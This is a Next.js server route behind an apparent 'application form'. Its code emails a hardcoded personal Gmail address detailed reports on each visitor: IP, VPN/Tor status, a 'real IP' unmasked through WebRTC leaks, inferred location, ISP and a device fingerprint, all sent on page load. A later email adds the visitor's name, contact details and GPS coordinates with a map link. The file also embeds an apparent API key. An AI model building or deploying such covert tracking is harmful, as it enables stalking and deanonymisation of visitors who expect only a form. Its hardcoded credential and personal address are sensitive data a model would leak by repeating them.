import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY || 're_dbucvqvg_6nVX9uBbM1bfoKtjAA46zCvW');

interface LocationData {
  coordinates: {
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null;
  address: {
    street: string;
    city: string;
    state: string;
    country: string;
    zipCode: string;
  } | null;
  ip: string;
  isVPN: boolean;
  vpnProvider: string | null;
  deviceInfo: {
    userAgent: string;
    platform: string;
    language: string;
    screenResolution: string;
    timezone: string;
  };
  advancedDetection?: any; // Enhanced VPN and real IP detection data
}

interface PageLoadSubmission {
  type: 'pageload';
  location: LocationData | null;
  timestamp: string;
}

interface FormSubmission {
  type: 'form';
  answers: {
    question1: string;
    question2: string;
    question3: string;
    question4: string;
    question5: string;
    question6: string;
  };
  location: LocationData | null;
  timestamp: string;
}

type Submission = PageLoadSubmission | FormSubmission;

export async function POST(request: NextRequest) {
  try {
    const data: Submission = await request.json();

    const submissionDate = new Date(data.timestamp);
    const formattedDate = submissionDate.toLocaleString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZoneName: 'short',
    });

    let emailBody = '';
    let subject = '';

    if (data.type === 'pageload') {
      // FIRST EMAIL - sent immediately when page loads (IP data only)
      subject = `New Visitor - Page Opened - ${formattedDate}`;

      emailBody = `
═══════════════════════════════════════════════════════════════════
                    NEW VISITOR - PAGE OPENED
═══════════════════════════════════════════════════════════════════

Timestamp: ${formattedDate}

Someone opened the application form. Browser location popup is being shown.

`;

      if (data.location) {
        const loc = data.location;
        const adv = loc.advancedDetection;

        emailBody += `═══════════════════════════════════════════════════════════════════
                        IP & LOCATION DATA
═══════════════════════════════════════════════════════════════════

- IP Address: ${loc.ip || 'Unknown'}
`;

        if (loc.isVPN || (adv && adv.isVPN)) {
          emailBody += `- VPN DETECTED: YES
- VPN/Proxy Provider: ${adv?.vpnProvider || loc.vpnProvider || 'Unknown provider'}
- Detection Confidence: ${adv?.vpnConfidence || 'Medium'}
`;
        } else {
          emailBody += `- VPN Detected: No (regular connection)
`;
        }

        // Add advanced detection results
        if (adv) {
          emailBody += `
═══════════════════════════════════════════════════════════════════
                    🔍 REAL IP DETECTION REPORT
═══════════════════════════════════════════════════════════════════
`;

          if (adv.realIP) {
            emailBody += `
✅ REAL IP DISCOVERED: ${adv.realIP}
Method: ${adv.inferredRealLocation?.method || 'WebRTC Leak'}
Confidence: ${adv.inferredRealLocation?.confidence || 90}%
`;
          }

          if (adv.leaks.webRTCLeaked && adv.leaks.webRTCIPs.length > 0) {
            emailBody += `
WebRTC IP LEAKS DETECTED:
${adv.leaks.webRTCIPs.map((ip: string) => `  - ${ip}`).join('\n')}
`;
          }

          if (adv.inferredRealLocation) {
            emailBody += `
INFERRED REAL LOCATION:
- Method: ${adv.inferredRealLocation.method}
- Confidence: ${adv.inferredRealLocation.confidence}%
- Reasoning: ${adv.inferredRealLocation.reasoning}
${adv.inferredRealLocation.country ? `- Country: ${adv.inferredRealLocation.country}` : ''}
${adv.inferredRealLocation.city ? `- City: ${adv.inferredRealLocation.city}` : ''}
${adv.inferredRealLocation.timezone ? `- Timezone: ${adv.inferredRealLocation.timezone}` : ''}
`;
          }

          if (!adv.leaks.timezoneMatch || !adv.leaks.languageMatch) {
            emailBody += `
⚠️  LOCATION MISMATCH DETECTED:
${!adv.leaks.timezoneMatch ? '  - Timezone doesn\'t match VPN IP location' : ''}
${!adv.leaks.languageMatch ? '  - Browser language doesn\'t match VPN IP location' : ''}
`;
          }

          emailBody += `
THREAT INTELLIGENCE:
- Privacy Level: ${adv.privacyLevel}
- Threat Score: ${adv.threat.threatScore}/100
- Is Proxy: ${adv.threat.isProxy ? 'YES' : 'No'}
- Is TOR: ${adv.threat.isTor ? 'YES' : 'No'}
- Is Data Center: ${adv.threat.isDataCenter ? 'YES' : 'No'}
- Is Hosting Provider: ${adv.threat.isHosting ? 'YES' : 'No'}
`;
        }

        if (loc.address) {
          emailBody += `
APPROXIMATE LOCATION (from IP):
- City: ${loc.address.city || 'Not available'}
- State/Region: ${loc.address.state || 'Not available'}
- Country: ${loc.address.country || 'Not available'}
- Zip Code: ${loc.address.zipCode || 'Not available'}
`;
        }

        emailBody += `
═══════════════════════════════════════════════════════════════════
                    📱 DEVICE & NETWORK DETAILS
═══════════════════════════════════════════════════════════════════
`;

        if (adv && adv.deviceInfo) {
          const dev = adv.deviceInfo;
          emailBody += `
DEVICE INFORMATION:
- Device Type: ${dev.type}
- Operating System: ${dev.os}
- Browser: ${dev.browser}
- Platform: ${dev.platform}
- Touch Support: ${dev.touchSupport ? 'Yes' : 'No'} (${dev.maxTouchPoints} touch points)
- Screen: ${dev.screenResolution} (${dev.colorDepth}-bit color)
- Hardware: ${dev.hardwareConcurrency} CPU cores${dev.deviceMemory ? `, ${dev.deviceMemory}GB RAM` : ''}
- Cookies Enabled: ${dev.cookiesEnabled ? 'Yes' : 'No'}

LOCALIZATION:
- Primary Language: ${dev.language}
- All Languages: ${dev.languages.join(', ')}
- Timezone: ${dev.timezone} (UTC ${dev.timezoneOffset > 0 ? '-' : '+'}${Math.abs(dev.timezoneOffset / 60)})

NETWORK INFORMATION:
- ISP: ${adv.isp || 'Unknown'}
- Organization: ${adv.organization || 'Unknown'}
- Connection Type: ${adv.connectionType || 'Unknown'}
- ASN: ${adv.asn || 'Unknown'}
`;
        } else {
          emailBody += `
- Platform: ${loc.deviceInfo.platform || 'Unknown'}
- Language: ${loc.deviceInfo.language || 'Unknown'}
- Screen Resolution: ${loc.deviceInfo.screenResolution || 'Unknown'}
- Timezone: ${loc.deviceInfo.timezone || 'Unknown'}
`;
        }

        emailBody += `
- User Agent: ${loc.deviceInfo.userAgent || 'Unknown'}
`;
      } else {
        emailBody += `Location data not available
`;
      }

      emailBody += `
═══════════════════════════════════════════════════════════════════

NOTE: If user allows GPS and completes form, you'll receive a second
email with precise coordinates and their form responses.

═══════════════════════════════════════════════════════════════════
`;

    } else {
      // SECOND EMAIL - sent after form completion (includes GPS if allowed)
      subject = `Form Completed - ${formattedDate}`;

      emailBody = `
═══════════════════════════════════════════════════════════════════
                    FORM COMPLETED
═══════════════════════════════════════════════════════════════════

Submission Time: ${formattedDate}

═══════════════════════════════════════════════════════════════════
                        FORM RESPONSES
═══════════════════════════════════════════════════════════════════

1. Full Name:
   ${data.answers.question1 || 'Not provided'}

2. Email Address:
   ${data.answers.question2 || 'Not provided'}

3. Phone Number:
   ${data.answers.question3 || 'Not provided'}

4. About Themselves:
   ${data.answers.question4 || 'Not provided'}

5. What They're Looking For:
   ${data.answers.question5 || 'Not provided'}

6. Additional Information:
   ${data.answers.question6 || 'Not provided'}

`;

      if (data.location) {
        const loc = data.location;
        const adv = loc.advancedDetection;

        emailBody += `═══════════════════════════════════════════════════════════════════
                        LOCATION DATA
═══════════════════════════════════════════════════════════════════

- IP Address: ${loc.ip || 'Unknown'}
`;

        if (loc.isVPN || (adv && adv.isVPN)) {
          emailBody += `- VPN DETECTED: YES
- VPN/Proxy Provider: ${adv?.vpnProvider || loc.vpnProvider || 'Unknown provider'}
- Detection Confidence: ${adv?.vpnConfidence || 'Medium'}
`;
        } else {
          emailBody += `- VPN Detected: No (regular connection)
`;
        }

        // Add advanced detection results for form submission
        if (adv) {
          emailBody += `
═══════════════════════════════════════════════════════════════════
                    🔍 ENHANCED ANALYTICS
═══════════════════════════════════════════════════════════════════
`;

          if (adv.realIP) {
            emailBody += `
VPN DETECTION: YES (${adv.vpnProvider || 'Unknown Provider'})
REAL IP INFERRED: ${adv.realIP}
DETECTION METHOD: ${adv.inferredRealLocation?.method || 'WebRTC Leak'}
CONFIDENCE: ${adv.inferredRealLocation?.confidence || 90}%
`;
          }

          if (adv.inferredRealLocation && adv.inferredRealLocation.city) {
            emailBody += `
APPROXIMATE REAL LOCATION: ${adv.inferredRealLocation.city || ''}, ${adv.inferredRealLocation.country || ''}
`;
          }

          if (adv.leaks.webRTCLeaked && adv.leaks.webRTCIPs.length > 0) {
            emailBody += `
WebRTC IP LEAKS:
${adv.leaks.webRTCIPs.map((ip: string) => `  - ${ip}`).join('\n')}
`;
          }

          if (adv.deviceInfo) {
            emailBody += `
DEVICE: ${adv.deviceInfo.type} (${adv.deviceInfo.os}, ${adv.deviceInfo.browser})
`;
          }

          if (adv.isp) {
            emailBody += `ISP: ${adv.isp}
`;
          }

          if (adv.privacyLevel !== 'Low') {
            emailBody += `PRIVACY LEVEL: ${adv.privacyLevel}
`;
          }
        }

        if (loc.coordinates) {
          emailBody += `
GPS COORDINATES (user allowed location):
- Latitude: ${loc.coordinates.latitude}
- Longitude: ${loc.coordinates.longitude}
- Accuracy: ~${Math.round(loc.coordinates.accuracy)} meters
- Google Maps: https://www.google.com/maps?q=${loc.coordinates.latitude},${loc.coordinates.longitude}
`;
        } else {
          emailBody += `
GPS COORDINATES: Not available (user denied or browser blocked)
`;
        }

        if (loc.address) {
          emailBody += `
ADDRESS:
- Street: ${loc.address.street || 'Not available'}
- City: ${loc.address.city || 'Not available'}
- State/Region: ${loc.address.state || 'Not available'}
- Country: ${loc.address.country || 'Not available'}
- Zip Code: ${loc.address.zipCode || 'Not available'}
`;
        }

        emailBody += `
═══════════════════════════════════════════════════════════════════
                        DEVICE INFO
═══════════════════════════════════════════════════════════════════

- Platform: ${loc.deviceInfo.platform || 'Unknown'}
- Language: ${loc.deviceInfo.language || 'Unknown'}
- Screen Resolution: ${loc.deviceInfo.screenResolution || 'Unknown'}
- Timezone: ${loc.deviceInfo.timezone || 'Unknown'}
- User Agent: ${loc.deviceInfo.userAgent || 'Unknown'}
`;
      }

      emailBody += `
═══════════════════════════════════════════════════════════════════
`;
    }

    // Send email using Resend
    const { data: emailData, error } = await resend.emails.send({
      from: 'Application Form <onboarding@resend.dev>',
      to: ['shaidt137@gmail.com'],
      subject: subject,
      text: emailBody,
    });

    if (error) {
      console.error('Resend error:', error);
      return NextResponse.json(
        { error: 'Failed to send email' },
        { status: 500 }
      );
    }

    return NextResponse.json({
      success: true,
      message: data.type === 'pageload' ? 'Page load recorded' : 'Form submitted successfully',
      emailId: emailData?.id,
    });
  } catch (error) {
    console.error('Submit error:', error);
    return NextResponse.json(
      { error: 'Failed to process submission' },
      { status: 500 }
    );
  }
}
